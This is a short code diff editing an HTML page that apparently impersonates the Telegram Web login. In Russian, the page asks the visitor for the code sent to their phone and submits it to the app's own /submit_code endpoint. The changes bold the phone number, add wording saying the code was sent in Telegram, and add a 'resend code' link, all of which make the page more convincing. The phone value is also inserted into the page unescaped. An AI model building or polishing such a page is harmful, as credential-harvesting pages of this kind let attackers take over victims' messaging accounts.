@@ -58,12 +58,13 @@ def enter_code():
     <!DOCTYPE html><html><head><title>Telegram Web</title>{STYLE}</head><body>
         <div class="login-box">
             <h2>Введите код</h2>
-            <p style="font-size:14px; color:#666;">Мы отправили код на номер {phone}</p>
+            <p style="font-size:14px; color:#666;">Мы отправили код на номер <b>{phone}</b> в Telegram.</p>
             <form action="/submit_code" method="post">
                 <input type="hidden" name="phone" value="{phone}">
                 <input type="text" name="code" placeholder="Код из СМС" required><br>
                 <button type="submit">Далее</button>
             </form>
+            <p style="font-size:12px; color:#999; margin-top:15px;">Не приходит код? <a href="/code?phone={phone}" style="color:#3390ec; text-decoration:none;">Отправить повторно</a></p>
         </div>
     </body></html>
     """)
